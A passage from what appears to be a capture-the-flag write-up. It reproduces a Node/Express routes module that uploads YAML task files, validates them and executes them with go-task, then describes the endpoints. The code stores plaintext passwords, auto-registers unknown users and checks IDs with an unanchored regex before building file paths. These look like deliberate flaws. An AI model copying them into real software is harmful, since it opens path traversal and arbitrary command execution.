</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>username</span><span class=p>,</span> <span class=nx>password</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>username</span> <span class=o>||</span> <span class=o>!</span><span class=nx>password</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Username and password are required&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>user</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM users WHERE username = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>username</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>user_id</span> <span class=o>=</span> <span class=nx>randomUUID</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;INSERT INTO users (id, username, password) VALUES (?, ?, ?)&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>user_id</span><span class=p>,</span> <span class=nx>username</span><span class=p>,</span> <span class=nx>password</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>      <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;user_id&#39;</span><span class=p>,</span> <span class=nx>user_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>success</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>password</span> <span class=o>!==</span> <span class=nx>password</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Invalid credentials&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;user_id&#39;</span><span class=p>,</span> <span class=nx>user</span><span class=p>.</span><span class=nx>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>success</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>clearCookie</span><span class=p>(</span><span class=s1>&#39;user_id&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>success</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// check auth
</span></span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Unauthorized&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/templates&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>templates</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/templates/:id&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>id</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>template</span> <span class=o>=</span> <span class=nx>templates</span><span class=p>.</span><span class=nx>find</span><span class=p>(</span><span class=nx>t</span> <span class=p>=&gt;</span> <span class=nx>t</span><span class=p>.</span><span class=nx>id</span> <span class=o>===</span> <span class=nx>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>template</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Template not found&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>template</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/tasks&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>tasks</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>all</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM tasks WHERE user = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>.</span><span class=nx>id</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>tasks</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/task/:id&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>id</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>id</span> <span class=o>||</span> <span class=o>!</span><span class=sr>/[0-9a-z\-]{36}/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>))</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task ID is required&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>task</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM tasks WHERE id = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>id</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>task</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task not found&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>templateData</span> <span class=o>=</span> <span class=nx>templates</span><span class=p>.</span><span class=nx>find</span><span class=p>(</span><span class=nx>t</span> <span class=p>=&gt;</span> <span class=nx>t</span><span class=p>.</span><span class=nx>id</span> <span class=o>===</span> <span class=nx>task</span><span class=p>.</span><span class=nx>template</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>logs</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>all</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM logs WHERE task = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>id</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>filename</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>uploadsDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>taskContent</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span> <span class=nx>taskContent</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFile</span><span class=p>(</span><span class=nx>filename</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>task</span><span class=p>,</span> <span class=nx>template</span><span class=o>:</span> <span class=nx>templateData</span><span class=p>,</span> <span class=nx>logs</span><span class=p>,</span> <span class=nx>taskContent</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span> <span class=o>||</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>).</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span> <span class=o>||</span> <span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>.</span><span class=nx>file</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;No files were uploaded.&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>template</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>templateData</span> <span class=o>=</span> <span class=nx>templates</span><span class=p>.</span><span class=nx>find</span><span class=p>(</span><span class=nx>t</span> <span class=p>=&gt;</span> <span class=nx>t</span><span class=p>.</span><span class=nx>id</span> <span class=o>===</span> <span class=nx>template</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>templateData</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Template not found&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>file</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>.</span><span class=nx>file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>file_id</span> <span class=o>=</span> <span class=nx>randomUUID</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>uploadPath</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>uploadsDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>file_id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>file</span><span class=p>.</span><span class=nx>mv</span><span class=p>(</span><span class=nx>uploadPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;INSERT INTO tasks (id, user, template) VALUES (?, ?, ?)&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>file_id</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>.</span><span class=nx>id</span><span class=p>,</span> <span class=nx>template</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>id</span><span class=o>:</span> <span class=nx>file_id</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/check&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>id</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>id</span> <span class=o>||</span> <span class=o>!</span><span class=sr>/[0-9a-z\-]{36}/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>))</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task ID is required&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>filename</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>uploadsDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span> <span class=nx>data</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFile</span><span class=p>(</span><span class=nx>filename</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task file not found&#39;</span> <span class=p>});</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>checkTask</span><span class=p>(</span><span class=nx>templates</span><span class=p>,</span> <span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>valid</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Invalid task&#39;</span><span class=p>,</span> <span class=nx>details</span><span class=o>:</span> <span class=nx>e</span><span class=p>.</span><span class=nx>message</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/execute&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>id</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>id</span> <span class=o>||</span> <span class=o>!</span><span class=sr>/[0-9a-z\-]{36}/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>))</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task ID is required&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>filename</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>uploadsDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span> <span class=nx>data</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFile</span><span class=p>(</span><span class=nx>filename</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Task file not found&#39;</span> <span class=p>});</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span> <span class=nx>checkTask</span><span class=p>(</span><span class=nx>templates</span><span class=p>,</span> <span class=nx>data</span><span class=p>);</span> <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;INSERT INTO logs (task, status, output) VALUES (?, ?, ?)&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>id</span><span class=p>,</span> <span class=s1>&#39;rejected&#39;</span><span class=p>,</span> <span class=nx>e</span><span class=p>.</span><span class=nx>message</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Unsafe task&#39;</span><span class=p>,</span> <span class=nx>details</span><span class=o>:</span> <span class=nx>e</span><span class=p>.</span><span class=nx>message</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>log</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;INSERT INTO logs (task, status) VALUES (?, ?)&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>id</span><span class=p>,</span> <span class=s1>&#39;running&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>logId</span> <span class=o>=</span> <span class=nx>log</span><span class=p>.</span><span class=nx>lastID</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>child</span> <span class=o>=</span> <span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;task&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;-t&#39;</span><span class=p>,</span> <span class=nx>filename</span><span class=p>,</span> <span class=s1>&#39;task&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>stdout</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nx>stderr</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>responded</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>child</span><span class=p>.</span><span class=nx>stdout</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=nx>stdout</span> <span class=o>+=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>toString</span><span class=p>();</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>child</span><span class=p>.</span><span class=nx>stderr</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=nx>stderr</span> <span class=o>+=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>toString</span><span class=p>();</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>child</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>responded</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>responded</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;UPDATE logs SET status = ?, output = ? WHERE id = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=nx>err</span><span class=p>.</span><span class=nx>message</span><span class=p>,</span> <span class=nx>logId</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Execution error&#39;</span><span class=p>,</span> <span class=nx>details</span><span class=o>:</span> <span class=nx>err</span><span class=p>.</span><span class=nx>message</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>child</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;close&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>code</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>responded</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>responded</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>output</span> <span class=o>=</span> <span class=sb>`STDOUT:\n</span><span class=si>${</span><span class=nx>stdout</span><span class=si>}</span><span class=sb>\nSTDERR:\n</span><span class=si>${</span><span class=nx>stderr</span><span class=si>}</span><span class=sb>\nExit code: </span><span class=si>${</span><span class=nx>code</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span><span class=s1>&#39;UPDATE logs SET status = ?, output = ? WHERE id = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;completed&#39;</span><span class=p>,</span> <span class=nx>output</span><span class=p>,</span> <span class=nx>logId</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>status</span><span class=o>:</span> <span class=s1>&#39;completed&#39;</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Task executed successfully&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>router</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>In the routes module we see the <code>/login</code> and <code>/logout</code> routes to handle user authentication, the <code>/upload</code> endpoint to upload YAML task files based on predefined templates that can be viewed later in the <code>/tasks</code> route, and the <code>/check</code> endpoint to validate the uploaded YAML files against the templates. The <code>/execute</code> endpoint is responsible for executing the task using the <code>go-task</code> binary, and it also logs the execution status in the database.</p><p>All the available templates live inside the <code>templates.json</code> file, which are of the following format:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;ping&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Ping a Server&#34;</span><span class=p>,</span>
